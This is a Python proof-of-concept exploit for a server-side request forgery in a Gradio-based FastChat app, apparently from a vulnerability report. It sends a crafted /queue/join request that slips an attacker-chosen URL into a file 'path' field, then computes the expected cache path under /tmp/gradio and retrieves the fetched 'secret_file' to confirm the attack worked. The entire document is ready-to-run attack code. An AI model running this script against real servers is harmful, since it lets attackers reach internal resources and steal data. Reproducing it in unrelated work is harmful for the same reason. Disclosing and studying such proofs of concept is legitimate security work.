import requests
import json
import sys
import hashlib
import time

if len(sys.argv) != 2:
    print("Usage: python poc.py <URL>")
    sys.exit(1)

ssrf_dst = sys.argv[1]
print(f"ssrf_dst: {ssrf_dst}")

url = "http://fastchat-app:7860/queue/join"
headers = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0",
    "Origin": "http://fastchat-app:7860",
    "Referer": "http://fastchat-app:7860/"
}

# Match the exact schema from gradio_config
data = {
    "data": [
        [
            {
                "path": ssrf_dst,
                "url": None,
                "size": None,
                "orig_name": "secret_file",
                "mime_type": "application/octet-stream"
            }
        ]
    ],
    "fn_index": 11,
    "trigger_id": 2,
    "session_hash": "l8v6ku4cm8d"
}

print(f"\nTesting SSRF with URL: {ssrf_dst}")
print(f"Using payload:\n{json.dumps(data, indent=2)}")

response = requests.post(url, headers=headers, json=data)
print(f"Initial response status: {response.status_code}")
print(f"Initial response headers: {dict(response.headers)}")
print(f"Initial response text: {response.text}")

try:
    error_details = response.json()
    print(f"Error details: {json.dumps(error_details, indent=2)}")
except:
    pass

time.sleep(2)

sha1 = hashlib.sha256()
sha1.update(ssrf_dst.encode('utf-8'))
file_hash = sha1.hexdigest()

verify_url = f"http://fastchat-app:7860/file=/tmp/gradio/{file_hash}/secret_file"
print(f"\nChecking file at: {verify_url}")
verify_response = requests.get(verify_url)
print(f"Verify response: {verify_response.text}")

if "File not found" not in verify_response.text:
    print("Success!")
    sys.exit(0)

print("Exploit failed")
sys.exit(1)